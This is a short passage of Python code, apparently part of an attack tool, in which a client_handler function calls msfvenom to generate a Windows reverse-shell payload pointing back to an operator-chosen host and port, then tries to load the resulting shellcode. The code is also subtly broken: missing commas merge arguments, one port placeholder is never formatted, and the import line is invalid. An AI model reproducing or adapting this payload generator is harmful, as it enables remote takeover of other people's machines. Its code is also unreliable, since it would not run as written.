...
def client_handler(conn):
	mutex.acquire()
	cmd=subprocess.Popen(['msfvenom', '-p' 'windows/shell_reverse_tcp', f'LHOST={IP}', 'LPORT={S_PORT}', '-f', 'py', '-o' 'temp.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	output=cmd.stdout.read()
	from temp.py import buf
